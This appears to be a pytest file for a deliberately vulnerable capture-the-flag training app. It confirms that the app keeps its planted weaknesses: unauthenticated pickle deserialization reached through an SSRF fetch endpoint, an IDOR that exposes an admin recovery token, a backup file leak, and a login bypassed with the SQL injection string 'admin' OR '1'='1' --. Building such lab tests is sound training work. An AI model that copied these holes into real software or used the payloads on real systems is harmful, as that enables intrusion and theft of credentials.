"""验证 Stage 2 新漏洞端点：反序列化 + IDOR。"""
import base64
import importlib.util
import json
import os
import pathlib
import pickle
import shutil
import tempfile
import threading
import urllib.error
import urllib.request
from typing import Any, cast

import pytest


APP_PATH = pathlib.Path(__file__).resolve().parents[1] / "app.py"


def load_app_module():
    spec = importlib.util.spec_from_file_location("ctf_stage2_app", APP_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return cast(Any, module)


@pytest.fixture
def app_module(tmp_path):
    module = load_app_module()
    module.DB_PATH = str(tmp_path / "data" / "users.db")
    module.STATIC_DIR = str(tmp_path / "static")
    module.REPORTS_DIR = str(tmp_path / "reports")
    module.FLAG_2 = "FLAG{stage2_db_flag}"
    module.FLAG_3 = "FLAG{stage2_ssrf_flag}"
    module.FLAG_4 = "FLAG{stage2_credential_flag}"
    module.FLAG_5 = "FLAG{stage2_deserialize_flag}"
    module.FLAG_6 = "FLAG{stage2_idor_flag}"
    module.FLAG_3_PATH = str(tmp_path / "flag3.txt")
    module.FLAG_4_PATH = str(tmp_path / "flag4.txt")
    module.SYSTEM_CONFIG_PATH = str(tmp_path / "data" / "system_config.pkl")
    module.PROFILES_DIR = str(tmp_path / "data" / "profiles")
    module.authenticated_sessions.clear()
    module.init_db()
    module.ensure_static_files()
    module.ensure_report_templates()
    module.ensure_system_config()
    module.ensure_profiles()
    pathlib.Path(module.FLAG_3_PATH).write_text(f"{module.FLAG_3}\n")
    return module


@pytest.fixture
def running_server(app_module):
    server = app_module.ThreadingHTTPServer(("127.0.0.1", 0), app_module.CTFHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield app_module, f"http://127.0.0.1:{server.server_port}"
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()


# ---------- Flag5: 反序列化 ----------

def test_deserialize_load_config_returns_flag5(app_module, running_server):
    _, base_url = running_server
    # 通过 SSRF 通道访问内部反序列化端点
    import urllib.parse
    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/deserialize?action=load-config", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()
    assert app_module.FLAG_5 in body
    assert "review_token" in body


def test_deserialize_localhost_accessible(app_module, running_server):
    """localhost 可以直接访问内部端点（SSRF 设计的一部分）。"""
    _, base_url = running_server
    response = urllib.request.urlopen(f"{base_url}/api/internal/deserialize?action=load-config")
    data = json.loads(response.read().decode())
    assert data["status"] == "loaded"
    assert data["config"]["review_token"] == app_module.FLAG_5


def test_deserialize_custom_pickle(app_module, running_server):
    """反序列化端点可以 unpickle 任意输入。"""
    _, base_url = running_server
    payload = pickle.dumps({"test": "hello", "number": 42})
    data_b64 = base64.b64encode(payload).decode()
    import urllib.parse
    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/deserialize?data={urllib.parse.quote(data_b64)}", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()
    assert "deserialized" in body
    assert "dict" in body


def test_deserialize_invalid_pickle(app_module, running_server):
    """无效的 pickle 数据应返回错误而非崩溃。"""
    _, base_url = running_server
    bad_b64 = base64.b64encode(b"not-a-pickle").decode()
    import urllib.parse
    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/deserialize?data={urllib.parse.quote(bad_b64)}", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()
    assert "Deserialization failed" in body or "error" in body.lower()


# ---------- Flag6: IDOR ----------

def test_idor_guest_profile_accessible(app_module, running_server):
    """任意用户可访问 guest profile。"""
    _, base_url = running_server
    response = urllib.request.urlopen(f"{base_url}/api/users/2/profile")
    data = json.loads(response.read().decode())
    assert data["profile"]["username"] == "guest"
    assert data["profile"]["role"] == "user"


def test_idor_sysadmin_profile_leaks_flag6(app_module, running_server):
    """IDOR：sysadmin profile 包含 recovery_token（Flag6）。"""
    _, base_url = running_server
    response = urllib.request.urlopen(f"{base_url}/api/users/99/profile")
    data = json.loads(response.read().decode())
    assert data["profile"]["username"] == "sysadmin"
    assert data["profile"]["recovery_token"] == app_module.FLAG_6


def test_idor_nonexistent_user_404(app_module, running_server):
    """不存在的用户返回 404。"""
    _, base_url = running_server
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        urllib.request.urlopen(f"{base_url}/api/users/999/profile")
    assert exc_info.value.code == 404


def test_idor_no_auth_required(app_module, running_server):
    """IDOR 端点不需要任何认证——这就是漏洞本身。"""
    _, base_url = running_server
    # 不带任何 cookie/token 直接访问
    response = urllib.request.urlopen(f"{base_url}/api/users/1/profile")
    data = json.loads(response.read().decode())
    assert data["profile"]["username"] == "admin"


# ---------- 既有漏洞不受影响 ----------

def test_existing_sqli_still_works(app_module, running_server):
    """确认 SQL 注入漏洞在加入新端点后仍然可用。"""
    app_mod, base_url = running_server
    data = urllib.parse.urlencode(
        {"username": "admin' OR '1'='1' -- ", "password": "irrelevant"}
    ).encode()
    response = urllib.request.urlopen(
        urllib.request.Request(f"{base_url}/login", data=data, method="POST")
    )
    session_cookie = response.headers["Set-Cookie"].split(";", 1)[0]

    admin_panel = urllib.request.urlopen(
        urllib.request.Request(f"{base_url}/admin-panel", headers={"Cookie": session_cookie})
    )
    body = admin_panel.read().decode()
    assert app_mod.FLAG_2 in body


def test_existing_backup_leak_still_works(app_module, running_server):
    """确认备份泄露漏洞不受影响。"""
    app_mod, base_url = running_server
    backup_dir = pathlib.Path(app_mod.STATIC_DIR) / "backup"
    backup_dir.mkdir(parents=True, exist_ok=True)
    (backup_dir / "admin_notes.txt").write_text(f"flag: {app_mod.FLAG_1}")
    response = urllib.request.urlopen(f"{base_url}/static/backup/admin_notes.txt")
    assert app_mod.FLAG_1 in response.read().decode()


def test_existing_ssrf_still_works(app_module, running_server):
    """确认 SSRF 漏洞不受影响。"""
    app_mod, base_url = running_server
    import urllib.parse
    internal_url = urllib.parse.quote(
        f"{base_url}/api/internal/preview?resource=weekly-ops", safe=""
    )
    response = urllib.request.urlopen(f"{base_url}/preview/fetch?url={internal_url}")
    body = response.read().decode()
    assert app_mod.FLAG_3 in body
